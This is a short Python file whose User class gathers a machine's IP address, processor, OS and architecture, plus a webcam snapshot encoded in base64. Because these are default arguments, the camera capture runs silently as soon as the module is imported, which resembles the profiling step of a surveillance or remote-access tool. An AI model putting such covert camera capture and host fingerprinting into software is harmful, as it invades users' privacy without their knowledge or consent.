import platform
import cv2
import base64
import socket

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    arbitrary_addr = ('1.2.3.4', 1)
    try:
        s.connect(arbitrary_addr)
        ip = s.getsockname()[0]
    except:
        # If we can't find an IP, just set it as a local-host so we have something
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def get_image():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    _, buffer = cv2.imencode('.jpg', frame)
    return base64.b64encode(buffer)


class User:
    def __init__(self, ip=get_ip(), processor=platform.processor(), os=platform.system(),
                x86=platform.machine(), image=get_image()):
        self.processor = processor
        self.os = os
        self.x86 = x86
        self.ip = ip
        self.image = image

    @classmethod
    def from_json(cls, jd):
        return cls(**jd)
